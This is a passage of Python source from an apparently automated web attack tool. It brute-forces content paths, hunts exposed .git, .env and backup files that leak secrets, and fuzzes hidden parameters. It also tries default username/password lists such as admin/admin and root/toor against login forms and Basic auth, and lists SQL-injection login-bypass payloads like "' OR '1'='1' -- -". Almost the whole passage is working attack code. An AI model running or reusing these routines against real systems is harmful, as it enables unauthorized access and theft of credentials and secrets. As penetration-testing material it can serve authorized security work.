                    path = q.get_nowait()
                except _queue.Empty:
                    return
                status, length = _probe(hostval, path)
                with tested_lock:
                    tested[0] += 1
                if _is_hit(status, length, baselines):
                    with hits_lock:
                        if path not in seen:
                            seen.add(path)
                            hits.append(f"+ {status}  {path}")
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_DIRB_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if hits:
            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])

    total_hits = sum(len(v) for v in target_hits.values())
    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
    lines = [f"{scheme}://{ip}:{port}/ content sweep",
             f"wordlist: {wl_label}",
             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
             f"tested {tested[0]} · hits {total_hits} · stopped: {reason}"]
    if target_hits:
        for hostval in targets:
            hh = target_hits.get(hostval)
            if not hh:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += [f"  {h}" for h in hh]
    else:
        lines.append("\nno content discovered (soft-404 only)")
    return "\n".join(lines)


# known high-value exposures: (path, body-signature | None, high-severity?). The signature
# (bytes regex, matched against the response body) confirms a true positive with near-zero
# false positives — a soft-404 200 won't carry `[core]`, `PK\x03\x04`, `ref:`, etc.
_VCS_CHECKS = [
    (".git/HEAD", rb"ref:\s", True),
    (".git/config", rb"\[core\]", True),
    (".git/index", rb"^DIRC", True),
    (".git/logs/HEAD", rb"[0-9a-f]{40}", True),
    (".gitignore", None, False),
    (".svn/entries", None, True),
    (".svn/wc.db", rb"^SQLite format 3", True),
    (".hg/requires", None, True),
    (".bzr/branch-format", None, True),
    (".env", rb"[A-Z0-9_]{2,}=", True),
    (".env.bak", rb"[A-Z0-9_]{2,}=", True),
    (".env.example", rb"[A-Z0-9_]{2,}=", False),
    ("web.config", rb"(?i)<configuration", True),
    ("wp-config.php.bak", rb"(?i)db_password|<\?php", True),
    ("wp-config.php~", rb"(?i)db_password|<\?php", True),
    (".htpasswd", rb":\$", True),
    ("docker-compose.yml", rb"(?i)services:|version:", True),
    ("Dockerfile", rb"(?i)^FROM\s", False),
    ("application.properties", rb"(?i)password|url=", True),
    ("settings.py", rb"(?i)SECRET_KEY|DATABASES", True),
    ("backup.zip", rb"^PK\x03\x04", True),
    ("backup.tar.gz", rb"^\x1f\x8b", True),
    ("backup.sql", rb"(?i)insert into|create table|mysql dump", True),
    ("dump.sql", rb"(?i)insert into|create table", True),
    ("db.sql", rb"(?i)insert into|create table", True),
    ("database.sql", rb"(?i)insert into|create table", True),
    (".DS_Store", rb"Bud1", False),
]
# swap/backup copies of source files leak the source itself (creds, logic) → high
_VCS_SWAP_BASES = ["index.php", "config.php", "wp-config.php", "configuration.php",
                   "database.php", "settings.py", "app.py", ".env"]
_VCS_SWAP_FORMS = ["{b}.bak", "{b}~", "{b}.old", "{b}.save", "{b}.swp", ".{b}.swp", "{b}.orig"]
# archives named after the site, confirmed by their magic bytes where possible
_VCS_ARCH_EXTS = ["zip", "tar.gz", "tgz", "tar", "rar", "7z", "sql", "bak"]
_VCS_ARCH_SIG = {"zip": rb"^PK\x03\x04", "tar.gz": rb"^\x1f\x8b", "tgz": rb"^\x1f\x8b",
                 "tar": None, "rar": rb"^Rar!", "7z": rb"^7z\xbc\xaf",
                 "sql": rb"(?i)insert into|create table", "bak": None}
_VCS_HIGH_RE = re.compile(
    r"\.git|\.svn|\.hg|\.bzr|\.env|\.htpasswd|wp-config|web\.config|"
    r"\.sql$|\.(zip|tar\.gz|tgz|tar|rar|7z)$|"
    r"(\.php|\.py)(~|\.(bak|old|save|orig|swp))$|\.swp$", re.I)
_VCS_DEADLINE = 180
_VCS_THREADS = 20
_VCS_REQ_TIMEOUT = 5


def _vcs_derived(hostval: str) -> list:
    """(path, signature, high) probes derived from the target: source swap/bak files and
    archives named after the host's labels. Source swaps get a content signature (a leaked
    copy carries the source itself — <?php / python / KEY=), so they're confirmed with
    near-zero false positives instead of a fragile length diff."""
    cands = []
    for b in _VCS_SWAP_BASES:
        if b.endswith(".php"):
            sig, hi = rb"(?i)<\?php|<\?=", True
        elif b.endswith(".py"):
            sig, hi = rb"(?i)\b(import |from |def |class |SECRET_KEY|flask|django)\b", True
        elif b == ".env":
            sig, hi = rb"[A-Z0-9_]{2,}=", True
        else:
            sig, hi = None, False
        for form in _VCS_SWAP_FORMS:
            cands.append((form.format(b=b), sig, hi))
    parts = hostval.split(".")
    label = parts[0]
    apex = parts[-2] if len(parts) >= 2 and not hostval.replace(".", "").isdigit() else None
    bases = {label, apex, "backup", "www", "site", "web", "public_html"} - {None, ""}
    for base in sorted(bases):
        for ext in _VCS_ARCH_EXTS:
            cands.append((f"{base}.{ext}", _VCS_ARCH_SIG.get(ext), True))
    return cands


def _tool_vcs_hunt(ip: str, port: int, proto: str) -> str:
    """HTTP step-10 tool: hunt exposed VCS dirs, backups and config/secret files on the
    default host AND every discovered vhost (Host header, no /etc/hosts needed). Each hit is
    confirmed by a body signature where possible (magic bytes / content pattern) so a
    catch-all 200 can't cause a false positive. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_VCS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_VCS_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(8192)
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot hunt exposures")

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    targets = [ip] + [v for v in vhosts if v != ip]

    deadline = time.time() + _VCS_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    target_hits = {}

    def _rnd_path():
        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def _soft404_match(status, blen, baselines):
        for bs, bl in baselines:
            if bs is not None and status == bs and abs(blen - bl) <= max(200, int(bl * 0.05)):
                return True
        return False

    for hostval in targets:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        baselines = []
        for _ in range(2):
            bs, bb = _probe(hostval, _rnd_path())
            baselines.append((bs, len(bb or b"")))
        candidates = [(f"/{p}", sig, hi) for p, sig, hi in _VCS_CHECKS] + \
                     [(f"/{p}", sig, hi) for p, sig, hi in _vcs_derived(hostval)]
        q = _queue.Queue()
        for c in candidates:
            q.put(c)
        hits, seen = [], set()
        hits_lock = threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    path, sig, _hi = q.get_nowait()
                except _queue.Empty:
                    return
                status, body = _probe(hostval, path)
                with tested_lock:
                    tested[0] += 1
                ok, strong = False, False
                if status is not None and status != 404:
                    if sig is not None:
                        if re.search(sig, body or b""):
                            ok, strong = True, True          # signature confirms → certain
                    elif status in (200, 301, 302, 401, 403) and \
                            not _soft404_match(status, len(body or b""), baselines):
                        ok = True                            # no signature → soft-404 diff
                if ok:
                    with hits_lock:
                        if path not in seen:
                            seen.add(path)
                            hits.append(f"{'!' if strong else '+'} {status}  {path}")
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VCS_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if hits:
            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])

    total = sum(len(v) for v in target_hits.values())
    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ VCS / backup / config hunt",
             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
             f"tested {tested[0]} · hits {total} · {reason}",
             "(! = signature-confirmed · + = differs from soft-404)"]
    if target_hits:
        for hostval in targets:
            hh = target_hits.get(hostval)
            if not hh:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += [f"  {h}" for h in hh]
    else:
        lines.append("\nno exposed VCS / backups / config found")
    return "\n".join(lines)


# parameter-name wordlists, best first (multi-path entries merged); builtin fallback below.
_PARAM_WORDLISTS = [
    ("seclists burp-parameter-names", ["/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"]),
    ("arjun params", ["/usr/share/arjun/db/params.txt",
                      "/usr/lib/python3/dist-packages/arjun/db/large.txt"]),
    ("seclists raft-medium-words", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"]),
]
_PARAM_BUILTIN = [   # ~120 high-value parameter names
    "id", "page", "file", "path", "dir", "folder", "include", "inc", "template", "tpl",
    "doc", "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "destination", "domain", "callback",
    "site", "feed", "host", "cmd", "exec", "command", "run", "ping", "system", "query",
    "q", "search", "s", "keyword", "user", "username", "uid", "userid", "account", "profile",
    "role", "admin", "debug", "test", "dev", "view", "action", "act", "do", "func", "module",
    "type", "cat", "category", "item", "product", "pid", "name", "email", "token", "key",
    "api_key", "apikey", "auth", "session", "lang", "language", "locale", "format", "output",
    "order", "sort", "field", "column", "table", "db", "data", "value", "val", "content",
    "text", "message", "msg", "code", "status", "state", "mode", "step", "start", "end",
    "limit", "offset", "count", "num", "size", "width", "height", "img", "image", "photo",
    "avatar", "upload", "filename", "filepath", "target", "ref", "referer", "from", "to",
    "date", "time", "year", "month", "day", "flag", "enable", "disable", "show", "hide",
]
_PARAM_DANGEROUS = {
    "file", "path", "dir", "folder", "include", "inc", "page", "template", "tpl", "doc",
    "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "domain", "callback", "site", "feed",
    "host", "cmd", "exec", "command", "run", "ping", "system", "shell", "query", "id", "uid",
    "userid", "user", "account", "profile", "role", "admin", "debug", "view", "action",
    "do", "func", "module", "filepath", "filename", "target",
}
_PARAM_STATIC_RE = re.compile(
    r"\.(js|css|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|pdf|zip|map|mp4|webp|json)(\?|$)", re.I)
_PARAM_DYNAMIC_RE = re.compile(r"\.(php|asp|aspx|jsp|jspx|cgi|pl|py|do|action)(\?|$)", re.I)
_PARAM_DEADLINE = 600
_PARAM_THREADS = 30
_PARAM_REQ_TIMEOUT = 5
_PARAM_MAX_ENDPOINTS = 12
_PARAM_MAX_WORDS = 5000


def _pick_param_wordlist() -> tuple:
    """Return (label, words) from the best available parameter-name wordlist, or builtin."""
    for label, paths in _PARAM_WORDLISTS:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return f"builtin ({len(_PARAM_BUILTIN)} params)", list(_PARAM_BUILTIN)


def _is_dynamic_endpoint(path: str) -> bool:
    if _PARAM_STATIC_RE.search(path):
        return False
    if "?" in path:
        return True
    if _PARAM_DYNAMIC_RE.search(path):
        return True
    last = path.rstrip("/").split("/")[-1]
    return "." not in last                                    # extensionless → a route


def _gather_param_endpoints(ip: str, port: int, proto: str) -> list:
    """(hostval, path) dynamic endpoints mined from earlier tools' stored output — dir-brute
    hits (with their [host] attribution) and http-source ENDPOINTS. Falls back to '/' per
    host + a few common pages when nothing was recorded yet."""
    eps, seen = [], set()

    def _add(hostval, raw):
        raw = raw.split("#")[0]
        base = raw.split("?")[0]
        if not base.startswith("/"):
            m = re.match(r"https?://[^/]+(/\S*)", raw)         # full URL → take its path
            if not m:
                return
            base = m.group(1).split("?")[0]
        if not base or not _is_dynamic_endpoint(raw):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            eps.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "dir-brute":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    _add(host, mp.group(1))
        elif sid == "http-source":
            section = None
            for ln in output.splitlines():
                mh = re.match(r"^([A-Z][A-Z ]+) \(\d+\):", ln)
                if mh:
                    section = mh.group(1)
                    continue
                if section == "ENDPOINTS":
                    m = re.match(r"\s+(\S+)", ln)
                    if m:
                        _add(ip, m.group(1))

    if not eps:                                               # nothing mined yet → sensible defaults
        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
        for h in [ip] + [v for v in vhosts if v != ip]:
            _add(h, "/")
        for p in ("/index.php", "/search.php", "/api", "/login.php"):
            _add(ip, p)
    return eps[:_PARAM_MAX_ENDPOINTS]


def _tool_param_hunt(ip: str, port: int, proto: str) -> str:
    """HTTP step-11 tool: hidden GET-parameter discovery on dynamic endpoints mined from
    earlier steps. A param is reported when its value reflects in the response (primary,
    near-zero FP) or when it materially changes a stable response vs a junk-param baseline.
    Endpoints that reflect any value, or whose response is unstable, fall back to reflection-
    only to keep precision. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536).decode("utf-8", "replace")
            return resp.status, body
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot param-hunt")

    _wl_label, words = _pick_param_wordlist()
    words = words[:_PARAM_MAX_WORDS]
    endpoints = _gather_param_endpoints(ip, port, proto)
    canary = "pshx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    deadline = time.time() + _PARAM_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    results = {}                                              # hostval -> {path: [params]}

    def _rnd():
        return "zz" + "".join(random.choices(string.ascii_lowercase, k=8))

    for hostval, path in endpoints:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        # baseline: two junk params → stability + does the app reflect any value?
        j1 = _probe(hostval, f"{path}?{_rnd()}={canary}")
        j2 = _probe(hostval, f"{path}?{_rnd()}={canary}")
        if j1[0] is None:
            continue
        b_status, b_body = j1
        b_len = len(b_body or "")
        reflect_trust = canary not in (b_body or "") and canary not in (j2[1] or "")
        stable = j2[0] == b_status and abs(len(j2[1] or "") - b_len) <= max(64, int(b_len * 0.03))

        q = _queue.Queue()
        for w in words:
            q.put(w)
        found, found_lock = [], threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    param = q.get_nowait()
                except _queue.Empty:
                    return
                status, body = _probe(hostval, f"{path}?{param}={canary}")
                with tested_lock:
                    tested[0] += 1
                hit = False
                if status is not None:
                    if reflect_trust and body and canary in body:
                        hit = True                            # value reflected → param is processed
                    elif stable and (status != b_status or
                                     abs(len(body or "") - b_len) > max(64, int(b_len * 0.03))):
                        hit = True                            # stable endpoint reacted to this param
                if hit:
                    with found_lock:
                        if param not in found:
                            found.append(param)
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_PARAM_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if found:
            results.setdefault(hostval, {})[path] = sorted(found)

    total = sum(len(ps) for d in results.values() for ps in d.values())
    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ hidden parameter discovery",
             f"wordlist: {_wl_label}",
             f"endpoints: {len(endpoints)} · tested {tested[0]} · params {total} · {reason}"]
    if results:
        for hostval in dict.fromkeys(h for h, _p in endpoints):
            d = results.get(hostval)
            if not d:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path in sorted(d):
                lines.append(f"  {path}?[{', '.join(d[path])}]")
    else:
        lines.append("\nno hidden parameters found")
    return "\n".join(lines)


# a SMALL curated set of product defaults — this is the default-creds check, NOT a
# brute-force (that is a separate, gated step). Kept short so it never trips a lockout.
_CREDS_DEFAULT = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "admin123"),
    ("admin", "changeme"), ("admin", "1234"), ("admin", "12345"), ("admin", "default"),
    ("administrator", "password"), ("administrator", "administrator"),
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
    ("user", "user"), ("test", "test"), ("guest", "guest"), ("guest", ""),
    ("sa", ""), ("operator", "operator"),
]
# product → (extra creds, extra login paths), matched against detected service/product/cpe
_CREDS_PRODUCT = {
    "tomcat":     ([("tomcat", "tomcat"), ("admin", "tomcat"), ("manager", "manager"),
                    ("tomcat", "s3cret")], ["/manager/html", "/host-manager/html"]),
    "jenkins":    ([("admin", "admin"), ("admin", "password")], ["/login"]),
    "grafana":    ([("admin", "admin")], ["/login"]),
    "phpmyadmin": ([("root", ""), ("root", "root"), ("root", "password")], ["/index.php"]),
    "gitlab":     ([("root", "5iveL!fe"), ("admin", "password")], ["/users/sign_in"]),
    "wordpress":  ([("admin", "admin"), ("admin", "password")], ["/wp-login.php"]),
    "kibana":     ([("elastic", "changeme")], ["/login"]),
    "zabbix":     ([("Admin", "zabbix")], ["/index.php"]),
}
_CREDS_PATH_RE = re.compile(
    r"admin|login|signin|sign-in|manager|portal|panel|console|auth|wp-login|phpmyadmin", re.I)
_CREDS_FALLBACK_PATHS = ["/admin", "/login", "/login.php", "/administrator", "/wp-login.php",
                         "/manager/html", "/phpmyadmin/", "/admin/login", "/user/login"]
_CREDS_ERR_RE = re.compile(
    r"invalid|incorrect|failed|wrong|denied|try again|bad (?:user|pass)|not (?:found|match)", re.I)
_CREDS_OK_RE = re.compile(
    r"logout|log out|sign out|dashboard|welcome|my account|successfully|control panel", re.I)
_CREDS_DEADLINE = 180
_CREDS_THREADS = 8
_CREDS_REQ_TIMEOUT = 5
_CREDS_MAX_TARGETS = 24


def _parse_login_form(html: str, page_path: str) -> "dict | None":
    """Pull the login <form> (the one with a password input): its action, method, the user
    and password field names, and any hidden fields (CSRF tokens) to echo back."""
    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
        if not re.search(r"type=[\"']?password", form, re.I):
            continue
        pm = re.search(r"<input[^>]*type=[\"']?password[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?password", form, re.I)
        if not pm:
            continue
        act = re.search(r"action=[\"']([^\"']*)[\"']", form, re.I)
        user_field, hidden = None, {}
        for tag in re.findall(r"<input[^>]*>", form, re.I):
            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
            tp = tp.group(1).lower() if tp else "text"
            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
            if not nm:
                continue
            nm = nm.group(1)
            if tp == "password":
                continue
            if tp == "hidden":
                vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
                hidden[nm] = vv.group(1) if vv else ""
            elif user_field is None and (tp in ("text", "email") or
                                         re.search(r"user|email|login|name", nm, re.I)):
                user_field = nm
        if user_field:
            return {"action": act.group(1) if act else "", "user": user_field,
                    "pass": pm.group(1), "hidden": hidden}
    return None


def _gather_login_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path) login/admin surfaces — dir-brute paths that look like auth or returned
    401, plus product-specific and common fallback paths, on the host and every vhost."""
    tgts, seen = [], set()

    def _add(hostval, path):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            tgts.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "dir-brute":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
                if mp and (mp.group(1) == "401" or _CREDS_PATH_RE.search(mp.group(2))):
                    _add(host, mp.group(2))

    prod_paths = []
    prods = _creds_products(ip)
    for key in prods:
        prod_paths += _CREDS_PRODUCT[key][1]
    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in prod_paths + _CREDS_FALLBACK_PATHS:
            _add(h, p)
    return tgts[:_CREDS_MAX_TARGETS]


def _creds_products(ip: str) -> set:
    """Which _CREDS_PRODUCT keys match this host's detected services (name/product/cpe)."""
    blob = ""
    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
    return {k for k in _CREDS_PRODUCT if k in blob}


def _tool_default_creds(ip: str, port: int, proto: str) -> str:
    """HTTP step-12 tool: try a small set of DEFAULT credentials (not a brute-force) against
    HTTP Basic realms and HTML login forms found on the host + vhosts. Basic is deterministic
    (wrong creds → 401); forms are judged against a wrong-creds failure baseline (redirect
    away / error text gone / session cookie). Low concurrency to avoid lockout. Dead → raises."""
    import http.client
    import ssl
    import time
    import base64
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            setc = resp.headers.get_all("Set-Cookie") or []
            return (resp.status, data, setc, resp.headers.get("Location"),
                    resp.headers.get("WWW-Authenticate", "") or "")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None, ""
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test creds")

    base_creds = list(_CREDS_DEFAULT)
    for key in _creds_products(ip):
        for c in _CREDS_PRODUCT[key][0]:
            if c not in base_creds:
                base_creds.append(c)
    targets = _gather_login_targets(ip, port, proto)

    deadline = time.time() + _CREDS_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    surfaces = []
    valid = []
    lock = threading.Lock()

    def _cookie_names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _attempt_form(hostval, path, u, p):
        gs, gbody, gsc, _gl, _gw = _req(hostval, "GET", path)
        if gs is None:
            return None
        form = _parse_login_form(gbody or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _form_ok(cur, base):
        if cur is None:
            return False
        st, body, sc, loc, _w = cur
        fs, fbody, fsc, _fl, _fw = base
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        perr = bool(_CREDS_ERR_RE.search(body or ""))
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not perr:
            return True
        new = _cookie_names(sc) - _cookie_names(fsc)
        if new and not perr and any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _test_target(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        st, body, _sc, _loc, www = _req(hostval, "GET", path)
        if st is None:
            return
        if st == 401 and "basic" in www.lower():
            authtype = "Basic"
        elif st == 200 and re.search(r"type=[\"']?password", body or "", re.I) and \
                _parse_login_form(body or "", path):
            authtype = "form"
        else:
            return
        with lock:
            surfaces.append(f"{hostval}{path} ({authtype})")
        if authtype == "Basic":
            for u, p in base_creds:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                tok = base64.b64encode(f"{u}:{p}".encode()).decode()
                s2 = _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})[0]
                with tested_lock:
                    tested[0] += 1
                if s2 is not None and s2 != 401:
                    with lock:
                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (Basic) [{hostval}]")
                    return                                    # one working cred is enough
        else:
            fbase = _attempt_form(hostval, path, "nulluser_zx9", "wrongpass_zx9")
            if fbase is None:
                return
            for u, p in base_creds:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                cur = _attempt_form(hostval, path, u, p)
                with tested_lock:
                    tested[0] += 1
                if _form_ok(cur, fbase):
                    with lock:
                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (form) [{hostval}]")
                    return

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test_target(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_CREDS_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ default credentials check",
             f"surfaces: {len(surfaces)} auth · tested {tested[0]} creds · valid {len(valid)} · {reason}"]
    if surfaces:
        lines.append("\nAUTH SURFACES:")
        lines += [f"  {s}" for s in sorted(set(surfaces))]
    if valid:
        lines.append("\nVALID:")
        lines += [f"  {v}" for v in sorted(set(valid))]
    else:
        lines.append("\nno default credentials worked")
    return "\n".join(lines)


# non-destructive SQLi auth-bypass payloads (login logic only — no DROP/DELETE): (user, pass)
_SQLI_BYPASS = [
    ("' OR '1'='1' -- -", ""), ("' OR 1=1 -- -", ""), ("' OR 1=1#", ""),
    ("admin' -- -", ""), ("admin'#", ""), ('" OR "1"="1" -- -', ""),
    ('") OR ("1"="1" -- -', ""), ("' OR 'x'='x", ""), ("' OR ''='", ""),
    ("admin", "' OR '1'='1"), ("admin", "' OR 1=1 -- -"),
]
_SQL_ERROR_RE = re.compile(
    r"you have an error in your sql syntax|warning:\s*mysqli?_|unclosed quotation mark|"
    r"quoted string not properly terminated|ORA-\d{5}|PostgreSQL.*?ERROR|SQLSTATE\[|"
    r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|System\.Data\.SqlClient|"
    r"ODBC SQL Server Driver|mysql_fetch|supplied argument is not a valid MySQL", re.I)
_AUTHB_DEADLINE = 180
_AUTHB_THREADS = 8
_AUTHB_REQ_TIMEOUT = 5
_AUTHB_MAX_TARGETS = 16


def _tool_auth_bypass(ip: str, port: int, proto: str) -> str:
    """HTTP step-13 tool: on HTML login forms (host + vhosts), try (A) SQLi auth-bypass
    payloads judged against a wrong-creds failure baseline, (B) a single-quote probe that
    surfaces DB error strings (injectable even without bypass), and (C) username enumeration
    by comparing a likely-valid user's failure response to consistent invalid ones. Payloads
    are non-destructive; low concurrency. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), resp.headers.get("Location")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
